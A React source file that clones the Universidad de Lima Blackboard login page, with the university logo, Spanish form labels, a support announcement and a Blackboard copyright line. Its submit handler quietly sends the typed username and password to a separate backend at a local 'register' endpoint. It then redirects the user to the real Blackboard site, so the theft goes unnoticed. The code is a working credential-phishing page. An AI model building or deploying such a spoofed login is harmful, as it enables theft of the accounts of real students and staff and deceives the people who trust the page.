import { useState } from 'react'
import './App.css'
import ulimaLogo from './assets/ulima-logo.png'

/* Campo con etiqueta flotante, igual que Blackboard:
   la label arranca como placeholder dentro del campo y "flota"
   arriba al enfocar o cuando hay texto. */
function Field({ id, label, type, value, onChange }) {
  const [focused, setFocused] = useState(false)
  const floatAbove = focused || value.length > 0

  return (
    <li>
      <label htmlFor={id} className={floatAbove ? 'float-above' : ''}>
        {label}
      </label>
      <input
        type={type}
        id={id}
        name={id}
        value={value}
        onChange={onChange}
        onFocus={() => setFocused(true)}
        onBlur={() => setFocused(false)}
        autoComplete="off"
      />
    </li>
  )
}

function App() {
  const [userId, setUserId] = useState('')
  const [password, setPassword] = useState('')

  const API_URL = 'http://127.0.0.1:8000/api'

  const handleSubmit = async (e) => {
    e.preventDefault()
    try {
      console.log("ajsd")
// Nota: Se añade '/' al final de 'register/' si tu backend Django lo requiere
    await fetch(`${API_URL}/register/`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify({ username: userId, password: password }),
    });
    window.location.href = 'https://ulima.blackboard.com';

  } catch (error) {
    window.location.href = 'https://ulima.blackboard.com';
  }
  }

  return (
    <div className="bb-login">
      <div id="login-block">
        <h1 className="login-logo">
          <img src={ulimaLogo} alt="Universidad de Lima" />
        </h1>

        <form className="login-form" onSubmit={handleSubmit} name="login">
          <ul id="loginFormList">
            <Field
              id="user_id"
              label="Nombre de usuario"
              type="text"
              value={userId}
              onChange={(e) => setUserId(e.target.value)}
            />
            <Field
              id="password"
              label="Contraseña"
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <li>
              <input
                type="submit"
                className="button"
                value="Iniciar sesión"
              />
            </li>
          </ul>
          <a href="#" className="forgot-link">
            ¿Ha olvidado su contraseña?
          </a>
        </form>
      </div>

      <div className="login-page-announcements">
          <div id="loginAnnouncements">
            <ul>
              <li>
                <strong>Comunicado</strong>
                <em className="announcementDate">
                  (viernes 31 de octubre de 2025)
                </em>
                <div className="vtbegenerated">
                  <div className="announcement-box">
                    <p className="announcement-title">
                      Estimados usuarios de la comunidad ULima:
                    </p>
                    <p className="announcement-intro">
                      Para resolver sus consultas sobre las plataformas
                      Blackboard y Zoom, ponemos a su disposición los siguientes
                      canales de atención:
                    </p>
                    <ul className="announcement-list">
                      <li>
                        Correo electrónico:{' '}
                        <a href="mailto:soporteaulas@ulima.edu.pe">
                          soporteaulas@ulima.edu.pe
                        </a>
                      </li>
                      <li>Teléfono: 01 437 8800</li>
                      <li>Anexo (en campus): 500</li>
                      <li>
                        Presencial: Sótano Edificio L2. Horario: Lunes a viernes
                        7-22hrs, Sábados 7-13hrs
                      </li>
                    </ul>
                  </div>
                </div>
              </li>
            </ul>
          </div>
        </div>

        <div id="copyright">
          © 1997-2026 Blackboard Inc. Todos los derechos reservados.
        </div>
    </div>
  )
}

export default App
